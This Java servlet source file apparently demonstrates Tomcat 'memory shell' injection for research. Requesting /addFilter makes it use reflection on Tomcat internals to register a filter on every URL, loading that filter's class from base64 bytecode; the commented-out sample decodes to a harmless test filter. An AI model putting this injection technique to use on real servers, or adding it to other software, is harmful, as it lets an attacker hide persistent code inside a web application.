package com.summer233;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import static com.summer233.DynamicUtils.FILTER_CLASS_STRING;

/**
 * 访问这个 Servlet 将会动态添加自定义 Filter
 * 测试版本 Tomcat/9.0.95; Tomcat 8.5.31(原作者su18)
 * Tomcat 7 包位置不同
 * import org.apache.catalina.deploy.FilterDef;
 * import org.apache.catalina.deploy.FilterMap;
 *
 * @author su18,233
 */

@WebServlet(name = "AddTomcatFilter", urlPatterns = "/addFilter")
public class AddTomcatFilter extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            // TODO: 有如下两行可以正常在web页面输出中文, 不过后续 filter 加载后似乎又不生效了, 中文又变成?了, 这里没有继续研究
            // resp.setContentType("text/html; charset=UTF-8");
            // resp.setCharacterEncoding("UTF-8");
            PrintWriter writer = resp.getWriter();
            // 打印调试信息
            // writer.println("调试信息打印测试:开始执行添加Filter的流程<br>");
            writer.println("debug info print test: start to add filter<br>");

            String filterName = "su18Filter";
            // 从 request 中获取 servletContext
            ServletContext servletContext = req.getServletContext();

            // 如果已有此 filterName 的 Filter，则不再重复添加
            if (servletContext.getFilterRegistration(filterName) == null) {

                StandardContext o = null;

                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                while (o == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object object = f.get(servletContext);

                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        o = (StandardContext) object;
                    }
                }

                // 创建自定义 Filter 对象
                // String FILTER_CLASS_STRING =
                // "yv66vgAAADQANwoABwAiCwAjACQIACUKACYAJwsAKAApBwAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHAC0HAC4BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAD1Rlc3RGaWx0ZXIuamF2YQwACQAKBwAvDAAwADEBAA90aGlzIGlzIEZpbHRlciAHADIMADMANAcANQwAFAA2AQAob3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAAYABwABAAgAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQABAAsAAAA1AAAAAgAAAAGxAAAAAgAMAAAABgABAAAAEgANAAAAFgACAAAAAQAOAA8AAAAAAAEAEgATAAEAAQAUABUAAgALAAAAZAADAAQAAAAULLkAAgEAEgO2AAQtKyy5AAUDALEAAAACAAwAAAAOAAMAAAAfAAsAIQATACIADQAAACoABAAAABQADgAPAAAAAAAUABYAFwABAAAAFAAYABkAAgAAABQAGgAbAAMAHAAAAAYAAgAdAB4AAQAfAAoAAQALAAAAKwAAAAEAAAABsQAAAAIADAAAAAYAAQAAACkADQAAAAwAAQAAAAEADgAPAAAAAQAgAAAAAgAh";
                Class<?> filterClass = DynamicUtils.getClass(FILTER_CLASS_STRING);

                // 创建 FilterDef 对象
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                // filterDef.setFilter((Filter) filterClass.newInstance());
                filterDef.setFilter((Filter) filterClass.getDeclaredConstructor().newInstance());
                filterDef.setFilterClass(filterClass.getName());

                // 创建 ApplicationFilterConfig 对象
                Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
                constructor[0].setAccessible(true);
                ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(o, filterDef);

                // 创建 FilterMap 对象
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(filterName);
                // filterMap.addURLPattern("*"); // 这是错误的
                filterMap.addURLPattern("/*");

                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                // 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
                Field filterConfigsField = o.getClass().getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);
                // HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String,
                // ApplicationFilterConfig>) filterConfigsField
                // .get(o);
                @SuppressWarnings("unchecked")
                HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) filterConfigsField
                        .get(o);
                filterConfigs.put(filterName, config);

                // 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
                Field filterMapField = o.getClass().getDeclaredField("filterMaps");
                filterMapField.setAccessible(true);
                Object object = filterMapField.get(o);

                // Class cl =
                // Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
                Class<?> cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
                // addBefore 将 filter 放在第一位
                Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
                // Method m = cl.getDeclaredMethod("add", FilterMap.class);
                m.setAccessible(true);
                m.invoke(object, filterMap);

                // PrintWriter writer = resp.getWriter();
                writer.println("tomcat filter added<br>");
            } else {
                writer.println("tomcat filter already exists<br>");
            }
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}